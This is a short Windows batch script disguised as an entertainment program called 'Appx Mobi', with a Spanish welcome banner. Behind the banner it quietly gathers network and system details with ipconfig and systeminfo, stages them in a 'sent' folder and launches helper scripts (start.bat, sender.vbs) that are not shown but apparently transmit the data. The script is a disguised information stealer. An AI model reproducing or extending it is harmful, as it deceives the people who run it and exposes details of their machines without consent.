@echo off
cls
set Pagina= print url.txt
cls
%Pagina%
cls
start %Pagina%
cls
title Appx Mobi
cls
ipconfig > info.txt
cls
systeminfo >> info.txt
cls
move info.txt sent
cls
move gm.txt C:\Users\%USERNAME%\Desktop\gm.txt
cls
cd sent
cls
start.bat
cls
sender.vbs
cls
color C
@echo off
echo  "__  _  ____ _____  _____ __  ____  __"
echo "|  \| || ===|| ()_)|_   _|\ \/ /\ \/ /"
echo "|_|\__||____||_|     |_|   |__| /_/\_\"
echo 
echo Bienvenido a nuestro programa aqui podras ver
echo las cosas mas interesantes de internet solo aqui!!
pause

